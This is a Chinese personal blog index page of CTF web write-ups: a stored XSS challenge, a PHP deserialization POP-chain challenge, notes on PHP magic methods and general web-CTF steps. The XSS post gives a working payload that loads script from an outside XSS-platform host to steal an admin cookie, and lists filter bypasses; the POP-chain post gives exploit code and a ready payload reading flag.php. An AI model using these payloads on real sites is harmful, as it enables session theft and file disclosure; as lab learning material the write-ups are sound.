<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>baba童鞋的博客</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="baba童鞋的博客">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="baba童鞋的博客">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Jialu">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/huahua.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/huahua.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-xxs" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/31/xxs/" class="article-date">
  	<time datetime="2021-03-31T12:14:19.000Z" itemprop="datePublished">2021-03-31</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/31/xxs/">
        ctf xss利用_xss总结
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>[CISCN2019 华东北赛区]Web2</h1>
<h2>题目</h2>

<p><img src="/2021/03/31/xxs/1.png"><br>题目有两个窗口，吐槽和登录<br>没有注册界面，直接吐槽叭</p>
<h2>题解</h2>

<p>尝试弹窗<code>&lt;script&gt;alert(1)&lt;/script&gt</code><br>emmm并没有任何东西跳出来，那我们换一个html标签试试：<code>&lt;IMG SRC=&quot;javascript.:alert(&#039;XSS&#039;);&quot;&gt</code><br><img src="/2021/03/31/xxs/2.png"><br>有个不为人知的图片，看来是存在xxs漏洞了<br>吐槽页面是用来放XSS的，然后在反馈给管理员这样我们就能拿到管理员的cookie，因为这里是内网环境，所以只能去 <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/index.php?do=login">http://xss.buuoj.cn/index.php?do=login</a> 注册账号来接收cookie。</p>
<pre>&lt;/textarea&gt;'"&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2F8sVXk7%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;
</pre>
<p>代码写在吐槽上提交，访问，在xxs平台上就可以看到cookie和访问链接：<br><img src="/2021/03/31/xxs/3.png"><br>利用管理员的cookie，以及来访地址…node3.buuoj.cn/backend/admin.php登录即可得到flag（用chrome的edit this cookie插件比较方便）<br><img src="/2021/03/31/xxs/4.png"></p>
<h1>知识点</h1>
<h2>0x01xss作用</h2>

<p>emm完全不知道xxs是什么的我看了赵大佬的讲座，附上学习链接，记得白嫖：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XE411f7qT?from=search&seid=6094814016757224378">我爱学习~~</a><br>常见的输出函数：print()、 print_r()、 echo、 printf()、 sprintf()、 die()、 var_dump()、 var_export()<br>xss是往页面中添加了一段代码，并且被浏览器执行了<br>反射型将恶意代码写入参数，或者自己服务器上搭个form表单传送，用来钓鱼<br>存储型就等着别人点这个网页就行了</p>
<h2>0x02手段</h2>

<p>xss主要出现的地方：文章发表，评论回复，留言，资料设置等<br>xss无非就是要对方的cookie，但是常常会有httponly导致cookie并不能传到xss平台，这是一种有效的防御方式<br>但是xss预防应该从本质出发，即对该页面用户输入不能被执行<br>xss触发方法<br>利用script标签执行js<br>字符串用” ‘ 包裹都行<br>采用on事件方法<br>on事件不用单引号或双引号也可以触发，但是必须闭合标签内的引号<br>=&gt;点击就会触发 =&gt;鼠标移动触发<br>能够使用on事件的标签<br>支持on click事件的标签有</p>
<ul>
<li>, , , , ,
</li><li>, , ,
</li><li>, , , , ,
</li><li>, , , , ,,
</li><li>to
</li><li>, , , , , ,
</li></ul>

<p>采用a标签来做到xss</p>
<h2>0x03bypass方法</h2>

<p>采用编码，把字符串可以进行编码<br>后接十进制 =&gt; unicode编码<br>​ 后接十六进制 =&gt; unicode编码<br>采用标签中的空隙规则<br>假设正则是<br>]*)&gt;([\s\S][^<br>可以采用<br>==&gt; 最后有个p和&gt;间有空格绕过<br>采用双写绕过空字符替换<br>如果被删除关键字，可以采用重写方法比如<br>用大小写绕过不严格的waf<br>采用参数覆盖，覆盖掉hidden参数<br>我们输入的内容为：” onmouseover=alert(1) type=”text<br>有些标签的优先级高于”,导致执行xss</p>
<p>最后不明白那段代码是个什么意思，xxs也没改明白，在慢慢研究吧！</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-pop" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/30/pop/" class="article-date">
  	<time datetime="2021-03-30T09:02:06.000Z" itemprop="datePublished">2021-03-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/30/pop/">
        pop链-&gt;[MRCTF2020]ezpop
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>打开题目，给出如下代码:</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
    &#64;<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token variable">$a</span><span class="token operator">&#61;</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
</code></pre> 
<p><code>反序列化pop链魔法函数</code>，魔法函数方法在前面有总结</p>
<ol>
<li>题目通过get传入参数pop，会自动调动Show中的<code>_wake up()</code>
</li><li>_wake up()通过过滤对<code>$this->source</code>做字符串比较，如果$this->source是Show类，就调用了__toString()
</li><li>如果__toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的_get()方法。
</li><li>如果_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的_invoke()方法。
</li><li>利用文件包含漏洞，使用_invoke()读取flag.php的内容。
</li></ol>

<p><b>反序列化构造pop链的题目要注意两个点</b><br><code>1.入口点，反序列化POP链构造的入口</code><br><code>2.找危险函数，如果含有某些危险函数就可能导致漏洞达到目的</code><br>关于入口点要之一一些魔术方法：如<code>__construct 、__desstruct、__wakeup</code>等等<br>观察代码，发现有一个函数<code>include()</code>的内容可控，这里就可能造成文件包含漏洞<br>而反序列化的入口点在Show类中</p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre> 

<p>使用unserialize时触发<code>__wakeup()</code>，对$this-&gt;source正则匹配过滤关键字，如果$this-&gt;source此时是一个类的话，此时类就被当成了一个实例化对象，就会触发<code>__tostring</code></p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre> 

<p>Test类中的<code>__get()，__toString()</code>访问了str的source属性，str是Test类，不存在source属性，就会调用Text中的<code>__get()</code></p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
</code></pre> 

<p><code>__get()</code>方法将p作为函数使用&#xff0c;p实例化为<code>Modify</code>类&#xff0c;就调用了Modifier的<code>__invoke()</code>方法&#xff1b;<br> <code>__invoke()</code>调用了<code>append()</code>方法&#xff0c;包含<code>$value</code>&#xff0c;若将<code>$value</code>为伪协议&#xff0c;则可读flag.php源码</p> <p></p>
<p>构造POP链:/p>

</p><p>$a = new Show();<br>$a-&gt;source = new Show();<br>$a-&gt;source-&gt;str-&gt;p = new Modifier();</p>
<p>echo urlencode(serialize($a));</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">&#61;</span><span class="token double-quoted-string string">&#34;php://filter/read&#61;convert.base64-encode/resource&#61;flag.php&#34;</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token variable">$a</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span>
</code></pre>

<p>运行得到payload<br><img src="/2021/03/30/pop/1.png"><br>p:<br><code style="color:blue">?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D<br></code><br>得到base64编码，解密得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-fxl" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/25/fxl/" class="article-date">
  	<time datetime="2021-03-25T08:03:50.000Z" itemprop="datePublished">2021-03-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/25/fxl/">
        php反序列化---&gt;魔法函数
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这周，出了到web题，反序列化魔法函数，emmm题我是没做出来（别问，问就是我是废物wuwuwuwu~），但我总结了相关知识点，假以时日，但愿总结着终结着我就会了</p>
<h3>正文</h3>

<p><font size="4"><b style="color:pink">魔法函数实例</b></font><br>PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号__开头的，如：</p>
<ul>
<li>__construct()  具有构造函数的类会在每次创建新对象时先调用此方法 (构造函数)
</li><li>__destruct() 会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。(析构函数)
</li><li>__call() 在对象中调用一个不可访问方法时，__call() 会被调用
</li><li>__callStatic() 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。
</li><li>__get() 读取不可访问属性的值时，__get() 会被调用。
</li><li>__set() 在给不可访问属性赋值时，__set() 会被调用。
</li><li>__isset() 当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。
</li><li>__unset() 当对不可访问属性调用 unset() 时，__unset() 会被调用。
</li><li>__sleep() 当对象被serialize() 函数处理前，调用
</li><li>__wakeup() 当类被unserialize()时调用 __wakeup 方法，预先准备对象需要的资源。
</li><li>__toString() 该方法用于一个类被当成字符串时应怎样回应
</li><li>__invoke()  当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用
</li><li>__set_state()
</li><li>__clone() 当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值
</li><li>__debugInfo()  此方法由var_dump（）调用

</li></ul>

<p><b>这些函数在某些情况下会自动调用</b><br><font size="5"><b style="color:blue">①构造函数☞ __construct()</b></font><br><b>作用： </b>通常用于初始化对象的属性<br><b>自动调用与： </b>对象创建时自动调用<br><img src="/2021/03/25/fxl/1.png"><br><font size="5"><b style="color:blue">②析构函数☞ __destruct()</b></font><br>自动调用与： 当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br>析构函数无参数<br>eg：一个实列<br><img src="/2021/03/25/fxl/2.png"><br>当前对象的name属性为:is A<br>.<br>—-销毁对象后—-<br>当前对象已被销毁<br><font size="5"><b style="color:blue">③对对象的封装时的魔法函数</b></font><br>//__get() 外部访问不存在或者=私有属性时调用<br>//__set() 外部访问不存在或者=私有属性时调用<br>//__isset() 在外部检测是否存在某个属性时调用<br>//__unset() 外部销毁某个私有属性时调用时调用<br><font size="5"><b style="color:blue">④序列化和反序列化的魔法函数</b></font><br><b>__sleep()</b><br>自动调用时机：序列化时<br>作用：将允许序列化的对象放在一组数组中返回，序列化时只序列化指定的属性。<br><img src="/2021/03/25/fxl/3.png"><br><img src="/2021/03/25/fxl/4.png"><br><b>__wakeup()</b><br>自动调用时机：反序列化时<br>作用：反序列化时修改属性（对重新生成的对象的属性进行修改），或重新建立数据库连接，或执行其它初始化操作。<br>例1 ：<br><img src="/2021/03/25/fxl/5.png"><br><img src="/2021/03/25/fxl/6.png"><br>例2 重新建立数据库连接<br><img src="/2021/03/25/fxl/7.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-gj" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/20/gj/" class="article-date">
  	<time datetime="2021-03-20T12:41:26.000Z" itemprop="datePublished">2021-03-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/20/gj/">
        web步骤
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><b style="color:pink">1. 看源码</b></p>
<p>可以右键-&gt;【查看网页源代码】，也可以用火狐和谷歌浏览器的按F12键，按F12键可以修改html源代码方便构造一些值提交，但如果不需要的话直接右键查看源代码更直观，看网页里面的注释之类的都很方便。</p>
<p><b style="color:pink">2. 抓包&lt;/b.&gt;</b></p>
<p>这几天接触到的抓包一般是用burpsuite，如果要多次尝试可以右键-&gt;【send to Repeater】，如果要对某个字段爆破可以右键-&gt;【send to Intruder】，这是我比较常用的两种burpsuite的功能。</p>
<p>今天还接触到谷歌浏览器：F12-&gt;Network-&gt;勾选【Preserve log】，也可以方便查看请求包和响应包的数据（包头字段和网页数据等）。</p>
<p><b style="color:pink">3. 关注的几个地方</b></p>
<p>有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
<p><b style="color:pink">4. include漏洞</b></p>
